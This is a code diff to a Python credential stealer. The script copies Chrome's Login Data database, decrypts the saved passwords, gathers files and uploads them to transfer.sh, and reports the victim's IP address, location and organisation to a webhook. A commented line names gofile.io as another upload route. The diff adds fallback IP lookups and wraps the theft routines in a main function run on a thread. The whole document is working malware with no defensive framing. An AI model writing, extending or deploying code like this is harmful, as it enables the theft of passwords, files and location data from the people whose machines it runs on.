@@ -39,7 +39,8 @@ except:
     os.system("pip install cryptography")
 
 
-Webhook_Here = "X"
+Webhook_Here = "x"
+DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
 
 temp = os.getenv('TEMP')
 user = temp.split("\AppData")[0] 
@@ -74,7 +75,9 @@ headers = {
 
 url = {
     'ip': 'http://ipinfo.io/json',
-    'transfer' : "https://transfer.sh/"
+    '_ip_' : 'https://jsonip.com/',
+    'transfer' : "https://transfer.sh/",
+    'global_info' : "http://ip-api.com/json/"
 }
 
 temp_file_path = {
@@ -84,20 +87,37 @@ temp_file_path = {
 }
 
 def get_ip():
-    resp = requests.get(url["ip"])
-    json = resp.json()
-    ip = json['ip']
-    return ip
+    try:
+        try:
+            resp = requests.get(url["ip"])
+            json = resp.json()
+            ip = json['ip']
+            
+            return ip
+        except:
+            ip = False
+            return ip 
+    except:
+        resp = requests.get(url["_ip_"])
+        json = resp.json()
+        ip = json['ip']
+            
+        return ip
 
+#incoming feature
 def get_screen():
     screen = pyautogui.screenshot()
     screen.save('image.jpg')
 
 def LoadUrlib(hook, data='', files='', headers=''):
-    
-    for _ in range(8):
+    for i in range(8):
         try:
-            return urlopen(Request(hook, data=data, headers=headers)) if headers != '' else urlopen(Request(hook, data=data))
+            if headers != '':
+                r = urlopen(Request(hook, data=data, headers=headers))
+                return r
+            else:
+                r = urlopen(Request(hook, data=data))
+                return r
         except: 
             pass
 
@@ -105,24 +125,53 @@ def global_info_pc():
     
     global loc, org, city, region, postal, time_zone, flag
     
-    resp = requests.get(url['ip'])
-    json = resp.json()
-    city = json["city"]
-    region = json["region"]
-    postal = json["postal"]
-    loc = json['loc']
-    org = json['org']
-    postal = json['postal']
-    time_zone = json['timezone']
-    
-    country = json['country']
-    if country == 'FR':
-        flag = ":flag_fr:"
-    if country == 'US':
-        flag = ":flag_us"
-    else:
-        flag = ':flag_fr:'
-    
+    try:
+        resp = requests.get(url['ip'])
+        json = resp.json()
+        
+        city = json["city"]
+        region = json["region"]
+        postal = json["postal"]
+        loc = json['loc']
+        org = json['org']
+        time_zone = json['timezone']
+        
+        country = json['country']
+        if country == 'FR':
+            flag = ":flag_fr:"
+        if country == 'US':
+            flag = ":flag_us"
+        else:
+            flag = ':flag_fr:'
+    except:
+        cont = f"{url['global_info']}{get_ip()}"
+        resp = requests.get(cont)
+        json = resp.json()
+
+        if "status" == "fail":
+            city = 'No city found'
+            region = 'No region found'
+            loc = 'No loc'
+            org = "No org"
+            time_zone = 'cant find timezone'
+            country = ':flag_eu'
+
+        city = json["city"]
+        region = json["region"]
+        loc = f"{json['lat']},{json['lon']}"
+        org = json['org']
+        time_zone = 'cant find timezone'
+
+        country = json['countryCode']
+        if country == 'FR':
+            flag = ":flag_fr:"
+        if country == 'US':
+            flag = ":flag_us:"
+        if country == 'AU':
+            flag = ":flag_au:"
+        else:
+            flag = ':flag_eu:'
+       
 def global_info_pc_embed(username):
     data = {
         "content": f"`{get_ip()} - {username} ` ",
@@ -253,7 +302,7 @@ def file_vacum():
                         print(e)
 
 def upload_file_to_transfer_sh():
-    
+
     global url_list
     global file_list
     
@@ -272,20 +321,10 @@ def upload_file_to_transfer_sh():
         
         if url_ == 'Too Many Requests\n':
             continue
-        
+            #url_ = requests.post(f'https://{requests.get("https://api.gofile.io/getServer").json()["data"]["server"]}.gofile.io/uploadFile', files={'file': open(path + '\\' + name, 'rb')}).json()["data"]["downloadPage"]    
         url_list.append(url_)
 
 def password():
-    APP_DATA_PATH= os.environ['LOCALAPPDATA']
-    DB_PATH = r'Google\Chrome\User Data\Default\Login Data'
-
-    NONCE_BYTE_SIZE = 12
-
-    def encrypt(cipher, plaintext, nonce):
-        cipher.mode = modes.GCM(nonce)
-        encryptor = cipher.encryptor()
-        ciphertext = encryptor.update(plaintext)
-        return (cipher, ciphertext, nonce)
 
     def decrypt(cipher, ciphertext, nonce):
         cipher.mode = modes.GCM(nonce)
@@ -320,24 +359,6 @@ def password():
         ctypes.windll.kernel32.LocalFree(blobout.pbData)
         return result
 
-    def unix_decrypt(encrypted):
-        if sys.platform.startswith('linux'):
-            password = 'peanuts'
-            iterations = 1
-        else:
-            raise NotImplementedError
-
-        from Crypto.Cipher import AES
-        from Crypto.Protocol.KDF import PBKDF2
-
-        salt = 'saltysalt'
-        iv = ' ' * 16
-        length = 16
-        key = PBKDF2(password, salt, length, iterations)
-        cipher = AES.new(key, AES.MODE_CBC, IV=iv)
-        decrypted = cipher.decrypt(encrypted[3:])
-        return decrypted[:-ord(decrypted[-1])]
-
     def get_key_from_local_state():
         jsn = None
         with open(os.path.join(os.environ['LOCALAPPDATA'],
@@ -359,8 +380,8 @@ def password():
             self.passwordList = []
 
         def get_chrome_db(self):
-            _full_path = os.path.join(APP_DATA_PATH,DB_PATH)
-            _temp_path = os.path.join(APP_DATA_PATH,'sqlite_file')
+            _full_path = os.path.join(local,DB_PATH)
+            _temp_path = os.path.join(local,'sqlite_file')
             if os.path.exists(_temp_path):
                 os.remove(_temp_path)
             shutil.copyfile(_full_path,_temp_path)
@@ -466,10 +487,11 @@ def launch_global():
     global_info_pc()
     global_info_pc_embed(username)
 
+def main():
+    launch_global()
+    launch_password()
+    launch_vacumm()
 
-launch_global()
-launch_password()
-launch_vacumm()
-
+threading.Thread(target = main()).start()
 
 
